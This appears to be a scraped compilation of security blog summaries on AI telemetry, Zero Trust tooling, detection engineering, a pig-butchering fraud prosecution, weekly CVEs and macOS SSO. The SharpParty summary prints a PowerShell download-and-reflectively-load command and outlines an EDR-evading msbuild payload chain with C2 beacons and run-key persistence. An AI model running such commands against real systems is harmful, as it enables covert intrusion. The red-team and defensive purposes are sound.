storage, or lateral movement through service principals. Visibility is only as strong as the context you capture. The sooner you enable these settings, the sooner your SOC can understand why your models behave the way they do, not just what they did. Final thoughts: from prompts to protections As AI becomes part of core infrastructure, its telemetry must become part of your SOC\u2019s muscle memory. The same principles that power endpoint or identity defense (i.e. visibility, correlation, anomaly detection) now apply to model inference, token usage, and data grounding. Defender for Cloud and Defender XDR give you that continuity: alerts flow where your analysts already work, and your hunting logic evolves without a separate stack. Protecting AI isn\u2019t about chasing every model. It\u2019s about extending proven security discipline to the systems that now think alongside you.

The threat surface is new, but the hunt discipline isn\u2019t.",

      "summary": "Evolving Threats, Adaptive Defenses: The Security Practitioner\u2019s New Reality Cyber threats are advancing faster than ever, and the arrival of highly accessible AI tools with a low proficiency barrier has made this challenge one that most organizations cannot keep up with. According to the latest Microsoft Digital Defense Report , 28% of breaches begin with phishing, and we also see a 4.5x increase in AI automated phishing campaigns with higher click through rates. This example highlights the need for security organizations to not only prioritize hardened security policies but also automating detection of misconfigurations and deviations from the desired security posture. To help address these challenges, Microsoft launched the Secure Future Initiative (SFI) in November 2023, a multiyear effort to transform how we design, build, test, and operate our products and services, to meet the highest security standards. SFI unites every part of Microsoft to strengthen cybersecurity across our company and products. We\u2019ve committed to transparency by sharing regular updates with customers, partners, and the security community. Today, we released our third SFI progress report, which highlights 10 actionable patterns and practices customers can adopt to reduce risk, along with additional best practices and guidance. In this report, we share updates across every engineering pillar, introduce mapping to the NIST Cybersecurity Framework to help customers measure progress against a recognized industry standard, and showcase new security capabilities delivered to customers. We also provide implementation guidance aligned to Zero Trust principles, ensuring organizations have practical steps to reduce risk and strengthen resilience. Building on these learnings, we\u2019re excited to announce the public preview of the Microsoft Zero Trust Assessment tool, designed to help you identify common security gaps starting with Identity and Device pillars with the remaining pillars of Zero Trust coming soon. This assessment is informed by our own SFI learnings and aligned with widely recognized frameworks such as CISA \u2019s S C uB A project. Your feedback is critical as we continue to iterate and expand this tool. Our goal is for you to operationalize it in your environment and share insights as we add more pillars in the coming months. Introducing Zero Trust Assessment A deep dive into how the Microsoft Zero Trust Assessment works including report structure, prioritization logic, and implementation guidance is available below in this blog. The Microsoft Zero Trust Assessment empowers teams to make informed decisions, reduce blind spots, and prioritize remediation, turning insights into action. Once you download and run the tool ( installation guide ), it will assess your policy configurations and scan objects to generate a comprehensive report that not only highlights gaps and risks but also explains what was checked, why a test failed, and how your organization can implement the recommended configuration. This makes the results immediately actionable; security teams know exactly what steps to take next. The report features an overview page that presents aggregated data across your tenant, highlighting overall risk levels, patterns, and trends. This allows security teams to quickly assess their organization\u2019s posture, identify high-impact areas, and prioritize remediation efforts. Figure 1: Overview Page The assessment provides a detailed list of all the tests that were conducted, including those not applicable, so the results are clear and relevant. Each test includes risk level, user impact, and implementation effort, enabling teams to make informed decisions and prioritize fixes based on business impact. By combining clear guidance with prioritized recommendations, the Zero Trust Assessment turns insights into action, helping organizations reduce blind spots, strengthen security, and plan remediation effectively. Future updates will expand coverage to additional Zero Trust pillars, giving organizations even broader visibility and guidance. Figure 2: Outcome of the Identity/Devices Checks For each test performed, customers can see the exact policies or objects that are passing or failing the test with a direct link to where they can address it in the product, and guidance on how to remediate. Figure 3: Details of the test performed The report also provides granular details of the policies evaluated and any applicable assignment groups. In addition, the tool provides clear guidance on details of the test performed and why it matters, and the steps required to resolve issues effectively. How It Works Here\u2019s a quick summary of the steps for you to run the tool. Check our documentation for full details. First, you install the ZeroTrustAssessment PowerShell module. Install-Module ZeroTrustAssessment -Scope CurrentUser Then, you connect to Microsoft Graph and to Azure by signing into your tenant. Connect-ZtAssessment After that, you run a single command to kick off the data gathering. Depending on the size of your tenant, this might take several hours. Invoke-ZtAssessment After the assessment is complete, the tool will display the assessment results report. A sample report of the assessment can be viewed at aka. m s/zerotr u st/demo .

      "title": "SharpParty: Process Injection in C#",
      "summary": "Introduction As Anti-Virus and EDR solutions improve in detection and response capabilities, the job of a red teamer can become quite arduous. Malware payloads and techniques that once dominated networks have failed the test of time as EDR becomes aware of them. If your initial access payloads are detected immediately, your six-week long red team could be dead on arrival. Additionally, real-world threat actors have an abundance of time and resources; just imagine all the payloads, techniques, and 0-days that a sophisticated threat actor group may have developed over the years. It is essential for red teams to continuously develop their tactics, techniques, and procedures (TTPs) for the purpose of emulating real-life threat actors that are ever evolving. In this blog post, Stroz Friedberg, a LevelBlue company, introduces an addition to the red teamers\u2019 toolkit called \u201cSharpParty\u201d \u2013 a C# implementation of the process injection techniques dubbed \u201cPoolParty\u201d. We want to be very clear here: Stroz Friedberg did not create PoolParty nor did Stroz Friedberg extend the research into Windows Thread Pools. Rather, Stroz Friedberg simply translated the original source code of SafeBreach Labs from C++ to C#. The goal here is to give red teamers more options when picking their payloads. You can download SharpParty from our GitHub repository . Process Injection Before we dive into PoolParty, we must understand what process injection is first. Process injection is a relatively simple concept: inject code into another process. The purpose of injecting code into another process is to hide and obscure malicious activities. The actual implementation of process injection, however, is not as simple. If you would like to learn more about process injection, please refer to the following URLs: https://attack.mitre.org/techniques/T1055/ https://github.com/plackyhacker/Shellcode-Injection-Techniques Pool Party SafeBreach Labs masterfully exemplified the necessity of continuous TTP development through the release of \u201cPoolParty\u201d \u2013 a suite of process injection techniques that target Windows Thread Pools. With this research, SafeBreach Labs was able to bypass five of the leading EDR vendors. They also released a Proof-of-Concept GitHub repository , with source code written in C++. In short, PoolParty injects code into processes by crafting and inserting legitimate work items into a process\u2019 thread pool. A work item is a structure that contains a task specification, including specific conditions and code to execute when these conditions are met. Injected work items effectively act as the execution primitive, because the work item will execute our code when its conditions are met. For example, a work item can perform an action when a file is modified. The file modification in this example is the execution primitive and we do not have to manually start the execution via something like \u201cCreateRemoteThread\u201d, which is a well-known indicator of process injection. Motivation The primary motivation for a C# implementation is to allow the Pool Party techniques to be used in tools that leverage inline MSBuild tasks in XML files. A Task XML file can include embedded C# code that, when passed to \u201cmsbuild.exe\u201d, will be compiled and executed. While Task XMLs do support C++ (the language the original PoC was written in), they are only supported when the \u201cCppCodeProvider.dll\u201d assembly is present on the target machine. This DLL is included within some Visual Studio installations and is not guaranteed to be present on Windows machines by default. To ensure our payloads would detonate on practically any Windows host, we would need to implement the PoolParty technique in C#. Additionally, a C# implementation of PoolParty can be reflectively loaded into memory via PowerShell: $data = ( new-object net.webclient ) . downloaddata ( 'http://127.0.0.1/sharpparty.exe' ) ; $assem = [ System.Reflection.Assembly ] :: Load ( $data ) ; [ SharpParty.Program ] :: Main ( \"1 666\" . Split () ) ; Lastly, as offensive C# tooling continues to grow in popularity, a C# PoolParty implementation can be integrated into other offensive tooling as part of varying attack chains. For these reasons, Stroz Friedberg began implementation of the \u201cPoolParty\u201d technique in C# \u2013 SharpParty. Efficacy Against EDR During our testing, SharpParty was consistently able to bypass Microsoft Defender for Endpoint (MDE) initially. We submitted a report to Microsoft that demonstrated the bypass in March of 2025, which they validated and subsequently implemented detections for. Since then, we have observed an increase in the number of detections on SharpParty. Other EDR systems have detected and sometimes prevented the execution of SharpParty, largely based on the malicious use of \u201cmsbuild.exe\u201d as well as an unspecified process injection technique. While SharpParty inline tasks have seen increased detections from EDR recently, there are a few things worth noting: SafeBreach Labs publicly released their research on process injection via Windows Thread Pools, enabling EDR vendors to implement detections and monitoring for this technique. The use of inline tasks and \u201cmsbuild.exe\u201d is a relatively well-known technique. There is room for further development that could improve the payload\u2019s efficacy against EDR. Ultimately our goal is to give red teams one more item in their toolkit, one more means to meet an end, another test case that evaluates threat detection capabilities. Success Story During our research, we had the opportunity to further test our code on a client engagement. The following is a breakdown of our payload: A Task XML file with C# inline task that contains encrypted SharpParty code and helper functions to fetch the decryption key, decrypt the code, then compile and execute the decrypted code. The beacon shellcode is nested within an additional layer of encryption. HTTP Keying is used to retrieve and validate the decryption key, ensuring connectivity to the C2 server. The execution flow of the payload is depicted in the diagram below: How the dropper executes \u201cmsbuild.exe\u201d on the task XML is dependent on various conditions and is outside the scope of this blog post. With everything tested and ready to go, we joined a call with the client to screenshare the malware detonation. We disguised the payload in such a way that, from the victim\u2019s perspective, it looks like they downloaded a ZIP file and opened a PDF. Under the hood, we successfully executed SharpParty and obtained a Cobalt Strike beacon. After establishing the C2 channel, the client received no alarms on their side at that moment. After about 10 minutes, we suggested a test-case involving persistence via registry run keys to check if this activity is detected. The client agreed and we performed the test-case live on the call, setting an autorun key to execute the same SharpParty payload. Then, we logged out of the workstation, logged back in, and received the second beacon. The client was understandably concerned, seeing as we had established two C2 beacons and they had not received any detections. 30 minutes after detonation, the EDR picked up the malicious use of \u201cmsbuild.exe\u201d and an unspecified malicious payload in our target process, for which the client was alerted. While ultimately this code was still caught, there are two key takeaways: The execution of \u201cmsbuild.exe\u201d is what was picked up by EDR. There are 30 minutes between detonation and detection. While relatively small, this gap may be large enough for a threat actor to pivot within the network and maintain their access. Conclusion In summary, we have developed a C# implementation of PoolParty based on the incredible work from SafeBreach Labs, provided motivation for its existence, and shared a success story. As always, there is room for improvement. We have room to grow in terms of adding more variants, perhaps even discovering new ones, and improving the efficacy against EDR products. Our goal in publishing this blog post and open sourcing SharpParty is to share knowledge with the security community and provide avenues for future research and development.",

      "summary": "Agentic Detection Creation \u2014 Now With Atomic Red Team and Splunk MCP Integration TL;DR In my previous article, I walked through an automated detection engineering workflow from Sigma rule generation to SPL validation and documentation. This time, I\u2019ve extended the workflow with two new critical layers : Attack Testing via Atomic Red Team MCP to automatically simulate ATT&CK techniques. Detection Testing via Splunk MCP to validate that generated detections actually trigger during those simulated attacks. Together, they close the loop between rule generation , validation , and real-world verification turning the framework into a true end-to-end detection automation pipeline . Note: The attack and validation components, especially the attack part, may not work completely consistently in this version. It still needs improvement, but I wanted to share it early to provide some insight. krdmnbrk - Overview Recap: The Agentic Detection Creation Workflow The foundation of this system is an agent-driven pipeline (built in n8n) that automates detection creation and validation. Here\u2019s the core loop: Detection Developer Agent generates Sigma rules from prompts or chat inputs. Detection Reviewer Agent validates and approves the rules. Sigma \u2192 SPL Conversion via sigconverter.io to produce Splunk-ready queries. SPL Validation checks syntax, CIM/data model compliance, and macro usage. Report Generation builds full documentation (HTML, PDF, MD) with Sigma, SPL, and metadata. That was the original workflow. The new additions: Attack Testing and Detection Testing , extend it into the execution and verification layer . New Additions 1. Attack Test via Atomic Red Team MCP This new step automates adversary simulation using the MITRE ATT&CK framework. Once a detection rule is approved, the system: Performs a search based on the incoming MITRE technique and the scenario keywords. Then executes the attack in the isolated test environment. Note: The Atomic Red Team MCP is impressive, though I needed to modify a few files to tailor it to my specific use case. GitHub - cyberbuff/atomic-red-team-mcp: MCP server for Atomic Red Team 2. Detect Test via Splunk MCP The Detect Test phase confirms that the rule actually fires inside Splunk during or after the atomic test. Here\u2019s how it works: The SPL query (already validated) is passed to Splunk MCP through a secure splunk_search call. MCP executes the query safely with guardrails like time range limits and throttling. The output is inspected and returned to the agent. If a relevant event is not found, the system makes small adjustments to the query and retries (up to 10 attempts). If the SPL fires correctly, the rule passes the \u201creal-data verification\u201d step. If not, the validation agent classifies the failure: No Telemetry: Attack executed, but no data reached Splunk. Not Triggered: Telemetry exists, but rule logic failed. False Positive Risk: Rule triggered too often on benign logs. Splunk MCP Server Full Loop: From Generation to Verification Here\u2019s how everything now ties together: Generate Sigma Rule \u2192 via Developer Agent Review & Approve \u2192 via Reviewer Agent Convert to SPL \u2192 via sigconverter.io Validate SPL \u2192 syntax, CIM, macros Simulate Attack \u2192 via Atomic Red Team MCP Detect Test \u2192 via Splunk MCP Auto-Document \u2192 via Reporter Agent (PDF, HTML, Markdown) Once this loop completes, the system delivers: Verified Sigma + SPL pairs Attack and detection test results Validation summaries Ready-to-publish reports Conclusion With the integration of Atomic Red Team and Splunk MCP, the workflow now achieves true end-to-end detection lifecycle automation : \u201cGenerate \u2192 Validate \u2192 Simulate \u2192 Detect \u2192 Report.\u201d This approach bridges the gap between detection logic and real-world behavior, enabling faster, more reliable, and continuously verified security detections.

      "summary": "Over the passed couple of days, I've had images pop up in my feed showing people's workstations, most often with multiple screens. I've seen various configurations, some with three or more screens, but the other thing I've noted is that for those social media profiles, there's little else that's shared. Yep, they have a nifty configuration, one that they want to show off, but there's little to no attempts to show off their skills and abilities, what they've actually done with that configuration. Within cybersecurity, we see a lot of that, as well with certifications, commercial product licenses, and even open-source distributions - you know, those DVDs or VMs where someone else pulls together a list of free and open-source tools, puts a fancy background and/or menu system on it. A lot of these distros often derive their \"value\" from how new they are, or how many tools are included...but rarely do we see, \"...yeah, and this is how I used this distro to solve a case...\", or anything close to that. We often collect these things, like badges or challenge coins, but is someone really a better analyst if they have 4 instead of 3 screens? I honestly don't know...never having been able to afford multiple screens myself, I've spent the past 28 yrs operating off of single laptop screen. And yes, I have used some of those open-source tools, but I'm not a huge fan of distributions. All of this means that I tend to value something completely different from what the more vocal folks within the industry tend to value.

      "title": "Crypto-less Crypto Investment Scams: A California Case",
      "summary": "My readers will know by now that I am addicted to PACER - the Public Access to Court Electronic Records. When I see headlines like this one, I am compelled to dive in and read every publicly released document related to the case. USAO Central California The headline last month was that Shengsheng He, a 39 year old Chinese native living in La Puente California (described as being a resident of Los Angeles and Mexico City) had been sentenced to 51 months in prison and ordered to pay restitution in the amount of $26,867,242. The press release quotes Matthew Geleotti from the Attorney General's office: \"The defendant was part of a group of co-conspirators that preyed on American investors by promising them high returns on supposed digital asset investments when, in fact, they stole nearly $37 million from U.S. victims using Cambodian scam centers. Foreign scam centers, purporting to offer investments in digital assets have, unfortunately, proliferated.\" When talking about Crypto Investment Scams, they certainly have \"proliferated.\" They are currently the number one form of cybercrime financial losses in America, for the third year in a row, according to the FBI's IC3.gov. When we refer to these \"Pig Butchering\" scams as Crypto Investment Scams, it is easy to forget that many \"crypto\" scams still rely on the tried and true method of wire transfers to shell companies. When we first started exploring Romance Scams and their link to Business Email Compromise, the mostly Nigerian scammers referred to these as \"Wire-wire jobs.\" A wire goes from the victim to a shell company, and a second wire goes from the shell company to the ultimate beneficiary of the crime. While West African Organized Crime continues unabated, Chinese Organized Crime has taken the top spot and is learning that many of the methods of their West African predecessors are still quite useful. (figures from the ic3.gov 2024 report) In the Shengsheng He case each of the victims believed that they were wiring money to fund their crypto investments. Despite believing they have purchased crypto currency with these funds, they cannot be traced on the blockchain because they do not exist on the blockchain! The first wire transfer went to any of the dozens of shell companies that had been set up across America under the direction of Lu Zhang, an illegal immigrant from China. (Zhang pled guilty to \"conspiracy to commit money laundering on 12NOV2024.) The second wire in the \"wire-wire\" job would then send those funds to one of two bank accounts at Deltec Bank in the Bahamas in the name \"Axis Digital Limited.\" Deltec Bank's website is titled \"Deltec Bank: Ultra-Sophisticated Private Banking\" and boasts of their \"robust anti-money laundering framework.\" Axis Digital Limited served as an off-shore crypto exchange that seems to have been created for the purpose of taking \"wire-wire\" proceeds from Crypto Investment Scams and converting the funds to USDT before transferring them on to the Chinese Organized Crime gangs operating the scam centers in Sihanoukville, Cambodia. The case is being prosecuted in the Central District of California in four parts. Zhang, Wong, Walker, Zhu - Sea Dragon Trading & the Shell Companies One of the cases focuses primarily on the network of US-based shell companies created to receive the wire transfers from the victims. The victims believed they were funding their crypto investments, and would see \"deposits\" into their imaginary crypto investment accounts that corresponded to the amount of their wire transfers. Court records show that \" at least 284 transactions resulted in more than $80 Million in victim losses. \" The defendants in this case, with their ages as of December 14, 2023, were named in an initial press release entitled: \" Four Individuals Charged with Laundering Millions from Cryptocurrency Investment Scmas Known as 'Pig Butchering '\" Lu Zhang - (36, of Alhambra) was sentenced to 24 months + $7,560,014 restitution Joseph Wong - (32, of Rosemead) was sentenced to 51 months + $7,560,014 restitution Justin Walker - (31, of Cypress) was sentenced to 30 months Hailong Zhu - (40, of Naperville, Illinois) has not been sentenced yet Sea Dragon Trading, LLC and Sea Dragon Remodel, Inc were two of the companies created by Hailong Zhu, but the list of shell companies below collectively sent $20,083,987 in wires to Deltec Bank in the Bahamas: \u2022 BFC REMODEL, LLC; - 408 W Glendon Way, San Gabriel, CA 91776 \u2022 BFC SUPPLY, LLC; - 408 W Glendon Way, San Gabriel, CA 91776 \u2022 CREATIVE HOMEGOODS, LLC; - 823 W Huntington Dr. Apt B, Arcadia, CA 91007 \u2022 FUYU COMMERCE, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 GOOD LUCK TRADING, LLC; - 2220 Falling Leaf Ave, Rosemead, CA 91770 \u2022 HONG'S TRADING, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 KAIS TEA SET SUPPLIES, LLC; - 508 Bellows Ct, Diamond Bar, CA 91765 \u2022 LEADING CONSTRUCTION, LLC; - (multiple - unsure) \u2022 LJS REMODELING, LLC; - 1441 Paso Real Ave SPC 254, Rowland Heights, CA 91748 \u2022 LJS SUPPLY, LLC; - 650 W Duarte Rd Suite 100B, Arcadia, CA 91007 \u2022 LQH SUPPLY, LLC; - 823 W Huntington Dr, Apt B, Arcadia, CA 91007 \u2022 MINGXING REMODEL, LLC; - 4661 District Blvd, Vernon, CA 90058 \u2022 MINGXING TRADING, LLC; - 2220 Falling Leaf Ave, Rosemead, CA 91770 \u2022 QAG TRADING, INC. - 8811 Garvey Ave, 202, Rosemead, CA 91770 \u2022 QAG TRADING, LLC; - 3254 Evelyn Ave, Rosemead, CA 91770 \u2022 SEA DRAGON REMODEL, INC; - 4661 District Blvd, Vernon, CA 90058 \u2022 SEA DRAGON TRADING, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 SHANGHAI FOOD & GROCERIES, LLC; - 250 W Valley Blvd, Ste M, San Gabriel, CA 91776 \u2022 SUNRISE SUPPLY, LLC; - 823 W Huntington Dr. Apt B, Arcadia, CA 91007 \u2022 XIEYUNZHU TRADING, INC; - 1441 71st STreet, Apt 1, Brooklyn, NY 11228 \u2022 YHM SUPPLY, LLC; - 401 S Canyon Blvd Unit C, Monrovia, CA 91016 \u2022 YHM TRADING, LLC; - 401 S Canyon Blvd Unit C, Monrovia, CA 91016 \u2022 YZX LUXURY, LLC; - 1036 S Garfield Ave, B, Alhambra, CA 91801 \u2022 YZX TRENDING, LLC; - 1036 S Garfield Ave, B, Alhambra, CA 91801 Li & Zhang - the Telegram Connection In a second case, the defendants were: Daren Li, 41 Yicheng Zhang (39, of China) (sentenced to 18 months and $1,047,226 in restitution) Zhang & Li controlled four additional shell companies: \u2022 B&C Commerce, LLC - 180 E Valley Blvd Ste 202, San Gabriel, CA 91776 \u2022 Jimei Trading - 785 King St, San Gabriel, CA 91776 \u2022 SMX Beauty, Inc. - 132 E Emerson Ave, Unit C, Monterey Park, CA 91755 \u2022 SMX Travel, Inc. - 132 E Emerson Ave, Unit C, Monterey Park, CA 91755 The DOJ described Daren Li as \"41, a dual citizen of China and St. Kitts and Nevis, and a resident of China, Cambodia, and the UAE.\" He was arrested 12APR2024 at the airport in Atlanta. The DOJ press release \" Two Foreign Nationals Arrested for Laundering at Least $73M through Shell Companies Tied to Cryptocurrency Investment Scams \" says that Li and Zhang (a resident of Temple City, California) \"instructed co-conspirators in the laundering network to open bank accounts in the names of various shell companies. Once the victims sent funds to the shell companies, Li and Zhang monitored the lower-level co-conspirators who transferred the proceeds overseas to bank accounts at Deltec Bank in The Bahamas.\" The funds were then converted to cryptocurrency and sent to wallets, including at least one controlled by Li. Zhang's communications revealed \"extensive coordination to facilitate the international money laundering, including chats discussing the commission structure for the network, various shell companies used, victim information, and at least one video from a co-conspirator calling a U.S. financial institution.\" Daren Li is described as being \"the leader of the syndicate.\" Daren used his Telegram id (@KG71777) to communicate with the Cambodia-based members of the conspiracy. (Daren's email was: darren1575687@gmail.com). In court documents, the primary USDT address of the conspiracy is referred to as \"the TRteo\" address (for the first five characters of the address.) While TRteo is not an uncommon prefix, there are certainly very few such addresses that have received in excess of $39 Million in deposits, much less the higher number mentioned in the press release of $341 Million! In fact, there is only one. Chinese Blockchain intelligence company \"BlockSec\" blogged about that wallet on their QQ page. Using their tool, MetaSleuth, they were able to successfully identify the full wallet address, TRteottJGH5caJyy9qFuM8EJJGGCpDaxx6. The wallet became inactive on 29APR2024, but from its initial transaction on 16APR2021, more than $300 Million USD in more than 16,000 deposits flowed through that address, including transactions to and from HuionePay. BlockSec QQ Post Because Daren Li is described as being in control of this USDT wallet, it is generally considered that he was the leader of this entire enterprise. In July 2022, a meeting was held in Phnom Penh of the top leadership. Daren Li, JingLiang Su, Shengsheng He, and Jose Somarriba were all present. Daren Li also controlled a Binance account that received at least $4.5 Million in USDT that originated from \"Bahamas Account #2.\" He was also the source of funds to create that \"Bahamas Account #2 at Deltec Bank by transferring $999,383 in USDT. Jose Somarriba, Axis Digital, and Itemized Victim Losses Jose Somarriba (55, of Los Angeles) (sentenced to 36 months and $26,867,242.44 in restitution) is being held responsible for the losses from 174 victims. Those victims are listed by their initials and the dollar amounts that each had stolen from them. The average victim lost $154,409.44! (The median loss was $61,250.) The victims who had the most money stolen were in the amounts: $5,616,000; $2,340,000; and $1,030,279! Nine victims experienced a theft of $500,000 or more. (extract from loss amounts for 174 victims) Somarriba was a co-founder of Axis Digital, along with Shengsheng He and Jingliang Su. He was the one who opened the \"Bahamas Account #1\" at Deltec Bank which received $36.9 million in wire transfers from American bank accounts. He prepared fraudulent KYC forms to present to the banks as well as being primarily responsible for converting Deltec funds to USDT and transferring the funds to Cambodia via a USDT wallet referred to as \"TRteo\" in the court documents. Jingliang Su - the Dubai Connection The final of the linked cases is the case of Jingliang Su, (44, of China and Turkey). Su was sentenced to 51 months in federal prison and to pay $26,867,242.44 in restitution. Preferring the name \"James,\" Su resided in Dubai. He was a director of Axis Digital and was a signatory to \"Bahamas Account #1\" at Deltec Bank. He is described as being \"a citizen of China and St. Kitts and Nevis\" and a resident of Cambodia, the UAE, and the People's Republic of China.",

      "title": "The Week in Vulnerabilities: From IT Systems to Airport Weather Monitoring",
      "summary": "Cyble vulnerability intelligence researchers tracked 905 vulnerabilities in the last week, and more than 30 already have a publicly available Proof-of-Concept (PoC), significantly increasing the likelihood that those vulnerabilities may face real-world attacks. A total of 54 vulnerabilities were rated as critical under the CVSS v3.1 scoring system, while 35 received a critical severity rating based on the newer CVSS v4.0 scoring system. Here are some of the IT and ICS vulnerabilities flagged by Cyble threat intelligence researchers as meriting high-priority attention by security teams, including vulnerabilities under discussion by threat actors and three 10.0-severity vulnerabilities in airport weather systems. The Week\u2019s Top IT Vulnerabilities CVE-2025-12531 is a critical Improper Restriction of XML External Entity Reference vulnerability in IBM InfoSphere Information Server 11.7.0.0 through 11.7.1.6, which a remote attacker could exploit to expose sensitive information or consume memory resources. CVE-2025-34294 is a high-severity Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in Wazuh's File Integrity Monitoring (FIM). When configured with automatic threat removal, Wazuh contains a TOCTOU race condition that could potentially be exploited for SYSTEM-level arbitrary file or folder deletion and local privilege escalation. CVE-2025-12599 is a 10.0-severity cryptographic vulnerability related to the use of hard-coded cryptographic keys in Azure Access Technology's BLU-IC2 and BLU-IC4 devices through 1.19.5. CVE-2025-48703 is a critical remote code execution vulnerability in CentOS Web Panel (CWP) that could potentially allow an unauthenticated attacker who knows a valid non-root username to execute arbitrary commands on the server. The vulnerability has a high impact and is actively exploited, affecting over 200,000 servers worldwide. It was added to CISA\u2019s Known Exploited Vulnerabilities (KEV) catalog this week. CVE-2025-41244 is a high-severity local privilege escalation zero-day vulnerability in VMware Tools and VMware Aria Operations that was also added to the CISA KEV catalog this week. A malicious local actor with non-administrative privileges with access to a VM with VMware Tools installed and managed by Aria Operations with SDMP enabled could potentially escalate privileges to root on the same VM. CVE-2025-59287 continues to generate discussion by security researchers and threat actors, and Cyble honeypot sensors have detected attack attempts on the critical remote code execution vulnerability in Microsoft's Windows Server Update Services (WSUS). Remote unauthenticated attackers could potentially execute arbitrary code with SYSTEM privileges by exploiting unsafe deserialization of AuthorizationCookie objects. CVE-2023-20198 is attracting renewed attention because of an Australian Signals Directorate warning that threat actors are targeting unpatched Cisco devices. The critical vulnerability in the web UI of Cisco IOS XE software could allow a remote, unauthenticated attacker to create an account on the device and gain full administrator privileges, effectively taking full control of the system. The vulnerability affects a large number of internet-exposed Cisco devices. Vulnerabilities Discussed on Underground Forums Cyble dark web researchers observed several threat actors discussing weaponizing vulnerabilities on cybercrime and underground forums. Vulnerability exploits under discussion include: CVE-2025-64095 : A critical vulnerability affecting DNN (formerly DotNetNuke), an open-source web content management platform in the Microsoft ecosystem. The flaw exists in the default HTML editor provider in versions prior to 10.1.1. It could allow unauthenticated users to upload files and overwrite existing files without authorization or validation. This can lead to website defacement and potentially enable the injection of cross-site scripting (XSS) payloads when combined with other vulnerabilities. CVE-2025-52665 : A critical security vulnerability affecting Ubiquiti Inc.'s UniFi Access Application versions 3.3.22 through 3.4.31. The flaw arises from a misconfiguration that exposes a management API without proper authentication, potentially allowing a malicious actor with access to the management network to exploit it. The flaw could enable unauthenticated remote code execution (RCE), potentially allowing attackers to manipulate door access controls, retrieve sensitive information, or gain full control over affected devices. The vulnerability impacts the confidentiality, integrity, and availability of physical access control systems. CVE-2025-50168 : A high-severity type confusion vulnerability in the Windows Win32K - ICOMP component. This vulnerability could allow an authorized attacker with local access and low privileges to escalate their privileges by causing the system to access a resource using an incompatible type. The flaw lies in the improper validation of user-supplied data, leading to this type of confusion condition. CVE-2024-38077 : A critical vulnerability found in the Windows Remote Desktop Licensing Service, which poses a significant risk by potentially allowing remote code execution (RCE) on multiple affected Windows Server systems. CVE-2025-6440 : A critical vulnerability in the WooCommerce Designer Pro plugin for WordPress, specifically affecting all versions up to and including 1.9.26. This flaw could allow unauthenticated attackers to upload arbitrary files, including executable scripts, to a website\u2019s server, potentially leading to remote code execution and full site compromise. ICS Vulnerabilities Cyble researchers also highlighted critical industrial control system (ICS) vulnerabilities in Survision and Radiometrics products. Radiometrics VizAir Versions prior to 08/2025 are affected by three 10.0-severity vulnerabilities (CVE-2025-61945, CVE-2025-54863 and CVE-2025-61956). The Insufficiently Protected Credentials and Missing Authentication for Critical Function vulnerabilities could allow attackers to manipulate critical weather parameters and runway settings, mislead air traffic control and pilots, extract sensitive meteorological data, and cause significant disruption to airport operations, leading to hazardous flight conditions. CVE-2025-12108 is a critical Missing Authentication for Critical Function vulnerability affecting Survision License Plate Recognition LPR Camera. Successful exploitation of the vulnerability could allow an attacker to execute arbitrary code. Conclusion The wide range of vulnerable cyber and physical systems covered in this week\u2019s report highlights the vast challenges confronting security teams, who must be able to respond with rapid, well-targeted actions to successfully defend IT and critical infrastructure. A risk-based vulnerability management program should be at the heart of those defensive efforts. Other cybersecurity best practices that can help guard against a wide range of threats include segmentation of critical assets; removing or protecting web-facing assets; Zero-Trust access principles; ransomware -resistant backups; hardened endpoints, infrastructure, and configurations; network, endpoint , and cloud monitoring; and well-rehearsed incident response plans.

      "title": "Platform SSO for macOS",
      "summary": "Introduction As organizations accelerate their journey to passwordless authentication, Microsoft\u2019s Platform SSO for macOS offers a seamless, secure, and user-friendly experience for device and application sign-in. Built on Apple\u2019s SSO framework and tightly integrated with Microsoft Entra ID, Platform SSO empowers users to leverage modern authentication methods Touch ID, smart cards, and passkeys across their macOS devices, enterprise apps, and browsers. In this blog, we\u2019ll walk through the essentials of Platform SSO, supported authentication methods, configuration steps, and best practices for deployment in enterprise environments. What is Platform SSO for macOS? Platform SSO is a Microsoft feature for macOS (13+) that leverages Apple\u2019s SSO framework to enable single sign-on using Entra ID credentials. Users benefit from passwordless authentication, enhanced security, and a consistent experience whether logging into their device, enterprise applications, or web browsers. Key highlights: Passwordless sign-in: Use Touch ID (Secure Enclave), smart cards, or passwords for device and app authentication. Enterprise SSO plug-in: Activated for both application and browser-based sign-in, ensuring centralized identity management. No agent required: Utilizes built-in macOS platform capabilities for easy deployment and management. Authentication Methods Supported by Platform SSO Platform SSO supports three primary authentication methods on macOS: Feature Secure Enclave Smart Card Password Passwordless (phishing resistant) \u2705 \u2705 \u274c Touch ID supported for unlock \u2705 \u2705 \u2705 Can be used as passkey \u2705 \u274c \u274c Local Mac password synced with Entra ID \u274c \u274c \u2705 Supported on macOS 14.x+ \u2705 \u2705 \u2705 MFA mandatory for setup \u2705 \u2705 \u274c Secure Enclave: Recommended for most users, Secure Enclave uses hardware-bound cryptographic keys for app and web sign-ins, enabling passwordless and phishing-resistant MFA. After a reboot, users enter their local password once, then Touch ID can be used for subsequent unlocks. The device receives a hardware-backed Primary Refresh Token (PRT) for device-wide SSO. Smart Card: Ideal for high-security or compliance-driven environments, Smart Card authentication provides complete passwordless sign-in and unlock. After sign-in, the device receives a PRT and Workplace Join (WPJ) certificate for seamless SSO to Microsoft 365, Safari, and Entra-protected apps. Password: Users sign in with their Entra ID password, which syncs to the local account for SSO across apps. Intune password policies ensure alignment with Entra ID password rules, preventing sync or sign-in issues. How Platform SSO Works When a Mac device joins a Microsoft Entra ID tenant, it receives a hardware-bound WPJ certificate accessible only by the Microsoft Enterprise SSO plug-in. Apps and browsers require this certificate to access resources protected by Conditional Access policies. Platform SSO is configured using the Intune settings catalog and should ideally be assigned at device enrollment, but can also be applied to existing devices. Deployment Steps Device Enrollment in Intune: Organization-owned devices use Apple Business Manager or Apple Configurator; personally-owned devices enroll via Company Portal. Prerequisites: macOS 13+, Intune Company Portal app v5.2404.0+, supported browsers (Edge, Chrome with SSO extension, Safari), Intune RBAC permissions. Create Platform SSO Policy in Intune: Enable Platform SSO, select authentication method (Secure Enclave, Password, Smart Card), assign to user groups. Define Policies in Platform SSO Settings: Assign to users or groups with user affinity; avoid assigning to device groups to prevent Conditional Access issues. Enable MDM Push Certificate: Required for macOS enrollment in Intune. Deploy Company Portal App: Via Intune or manually from https://aka.ms/EnrollMyMac . Enroll Device and Validate Profiles: Sign in to Company Portal with Entra ID credentials and confirm device 